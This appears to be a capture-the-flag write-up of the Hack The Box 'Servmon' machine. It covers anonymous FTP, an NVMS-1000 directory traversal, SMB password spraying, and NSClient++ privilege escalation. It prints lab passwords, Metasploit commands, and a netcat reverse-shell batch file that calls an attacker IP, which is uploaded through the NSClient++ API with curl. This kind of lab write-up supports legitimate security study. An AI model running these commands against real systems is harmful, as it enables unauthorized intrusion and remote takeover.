@@ -1,0 +1,196 @@
+I"%/<p><strong><center>Ref°: HTB-09-Machine</center></strong></p>
+
+<p>— Servmon is a Windows machine that highlights an unsecured FTP server that will allow you to obtain important information about two users.</p>
+
+<p>Using a traversal directory from NVMS-1000 will allow us to retrieve a txt file (result of informations found above) showing several passwords in clear text.</p>
+
+<p>Privilege Escalation on NSClient++ allow to obtain root privilege from our compromise user.</p>
+
+<p><img src="/assets/images/servmon/HTB-Information-Servmon.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+<p>We find interesting services <code class="language-plaintext highlighter-rouge">ftp</code>, <code class="language-plaintext highlighter-rouge">web</code> on their usual ports and one custom port.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.184 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="ftp-on-port-21">FTP on port 21</h3>
+<hr />
+<p>Anonymous FTP login is allowed.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-enumftp.png" alt="Desktop View" /></p>
+
+<p>This access on the FTP give us the possibility to check two user folders <code class="language-plaintext highlighter-rouge">Nadine</code> and <code class="language-plaintext highlighter-rouge">Nathan</code>.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-enumftp1.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-enumftp2.png" alt="Desktop View" /></p>
+
+<p>Two notes are presents :</p>
+
+<p><strong>Nadine note :</strong></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-note1.png" alt="Desktop View" /></p>
+
+<p><strong>Nathan note :</strong></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-note2.png" alt="Desktop View" /></p>
+
+<h3 id="websites-on-port-80-and-8443">Websites on port 80 and 8443</h3>
+<hr />
+
+<p><strong>Port 80 :</strong> We have login page of <code class="language-plaintext highlighter-rouge">NVMS-1000</code> service.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-nvms1000.png" alt="Desktop View" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Directory Traversal</code> is possible on NVMS-1000. Reference : <a href="https://www.exploit-db.com/exploits/48311">https://www.exploit-db.com/exploits/48311</a></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-searchsploit.png" alt="Desktop View" /></p>
+
+<p><strong>Port 8443 :</strong> We have another service, named <code class="language-plaintext highlighter-rouge">NSClient++</code>. But the page seem to be break …</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-nsclientbreak.png" alt="Desktop View" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Privilege Escalation</code> is possible on NSClient++ 0.5.2.35 : <a href="https://www.exploit-db.com/exploits/46802">https://www.exploit-db.com/exploits/46802</a></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-msfv.png" alt="Desktop View" /></p>
+
+<p>The Nadine note reference about a file named <code class="language-plaintext highlighter-rouge">Passwords.txt</code> present on the Desktop of Nathan user.
+We use the first vulnerabilitie on NVMS-1000 to grab this file and gained the foothold.</p>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="directory-traversal">Directory Traversal</h3>
+<hr />
+<p>Let’s start metasploit to use the exploit module.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-confdt.png" alt="Desktop View" /></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search nvms
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/http/tvt_nvms_traversal
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>RHOSTS 10.10.10.184
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>FILEPATH <span class="s1">'Users\Nathan\Desktop\Passwords.txt'</span>
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+
+<p>We reveal much password in the file : <code class="language-plaintext highlighter-rouge">1nsp3ctTh3Way2Mars!</code>, <code class="language-plaintext highlighter-rouge">Th3r34r3To0M4nyTrait0r5!</code>, <code class="language-plaintext highlighter-rouge">B3WithM30r4ga1n5tMe</code>, <code class="language-plaintext highlighter-rouge">L1k3B1gBut7s@W0rk</code>, <code class="language-plaintext highlighter-rouge">0nly7h3y0unGWi11F0l10w</code>, <code class="language-plaintext highlighter-rouge">IfH3s4b0Utg0t0H1sH0me</code>,  <code class="language-plaintext highlighter-rouge">Gr4etN3w5w17hMySk1Pa5$</code></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-dt.png" alt="Desktop View" /></p>
+
+<p>Let’s see now if one of there match with Nadine or Nathan user.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search smb_login
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/smb/smb_login
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>USER_FILE .../Usernames.txt
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>PASS_FILE .../Passwords.txt
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.10.184
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-sshlogin.png" alt="Desktop View" /></p>
+
+<h3 id="remote-service-winrm-login">Remote Service WinRM login</h3>
+<hr />
+<p>We get the flag to validate our foothold.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-userflag.png" alt="Desktop View" /></p>
+
+<h2 id="3-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[3] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="nsclient-05235-exploitation">NSClient++ 0.5.2.35 Exploitation</h3>
+<hr />
+<p>When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator’s password in cleartext from the configuration file.
+From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.</p>
+
+<h3 id="plaintext-password-in-configuration-file">Plaintext Password in configuration file</h3>
+<hr />
+
+<p>From configuration file <code class="language-plaintext highlighter-rouge">c:\program files\nsclient++\nsclient.ini</code> we obtained the password : <code class="language-plaintext highlighter-rouge">ew2x6SsGTxjRwXOT</code></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-conf.png" alt="Desktop View" /></p>
+
+<p>But we also note that the administration page is accessible only in localhost. I tried to add my IP, but it requires a reboot.</p>
+
+<p>And we’re also having display problems accessing the service. We need to fix all that to operate properly.</p>
+
+<h4 id="chromium-">Chromium :</h4>
+
+<p>To fix the display issue, i use Chromium and not firefox.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>chromium <span class="nt">--no-sandbox</span> <span class="nt">--user-data-dir</span><span class="o">=</span>~/.config/chromium
+</code></pre></div></div>
+
+<h3 id="ssh-local-forwarding">SSH Local Forwarding</h3>
+<hr />
+<p>To bypass the localhost restriction, we use the local forwarding to forward a port from Servmon machine to my attacking machine.</p>
+
+<p>Reference - ssh tunneling : <a href="https://www.ssh.com/ssh/tunneling/example">https://www.ssh.com/ssh/tunneling/example</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> nadine 10.10.10.184 <span class="nt">-L</span> 1234:127.0.0.1:8443
+</code></pre></div></div>
+
+<p>We have now access on <code class="language-plaintext highlighter-rouge">https://127.0.0.1:1234</code> and the possibility to exploit Servmon machine.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-sshforward.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-access.png" alt="Desktop View" /></p>
+
+<h4 id="check-requirement-modules-">Check requirement modules :</h4>
+
+<p>Two modules are correctly enabled.</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-requirement1.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-requirement2.png" alt="Desktop View" /></p>
+
+<h4 id="put-evil-script-and-nc-tool-">Put evil script and nc tool :</h4>
+
+<p>From <code class="language-plaintext highlighter-rouge">c:\temp</code> we add our script. NC tool is also in place.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>copy con servmon.bat
+<span class="go">@echo off
+c:\Temp\nc.exe 10.10.14.89 443 -e cmd.exe
+</span></code></pre></div></div>
+
+<h4 id="setup-listener-on-attacking-machine-">Setup listener on attacking machine :</h4>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 443
+</code></pre></div></div>
+
+<h3 id="run-arbitrary-command-through-api">Run Arbitrary command through API</h3>
+<hr />
+<p>All action with API. Web interface is so break …</p>
+
+<p>We add our script :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-u</span> admin <span class="nt">-X</span> PUT https://localhost:8443/api/v1/scripts/ext/servmon.bat <span class="nt">--data-binary</span> <span class="s2">"c:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe 10.10.14.89 443 -e cmd.exe"</span>
+<span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-u</span> admin https://localhost:8443/api/v1/scripts/ext/scripts/servmon.bat
+</code></pre></div></div>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-addscript.png" alt="Desktop View" /></p>
+
+<p>And we launch the script :</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-executescript.png" alt="Desktop View" /></p>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+
+<p>We obtain root privilege :</p>
+
+<p><img src="/assets/images/servmon/HTB-Images-Servmon-rootflag.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>Monitoring is not protection.</strong></p>
+
+  <p>Myself</p>
+</blockquote>
+:ET
